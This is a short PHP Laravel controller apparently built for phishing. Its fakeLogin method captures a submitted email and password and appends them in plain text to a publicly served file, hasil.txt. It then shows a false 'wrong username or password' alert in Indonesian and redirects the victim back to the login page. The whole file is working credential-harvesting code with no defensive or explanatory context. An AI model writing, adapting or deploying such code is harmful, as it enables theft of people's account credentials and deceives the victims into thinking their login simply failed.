<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class PhishController extends Controller
{
    public function fakeLogin(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');

        $data = "Email: $email | Password: $password" . PHP_EOL;
        file_put_contents(public_path('hasil.txt'), $data, FILE_APPEND);

        // Tampilkan alert dan redirect balik
        return response("<script>alert('Username atau Password salah!'); window.location.href='/login';</script>");
    }
}

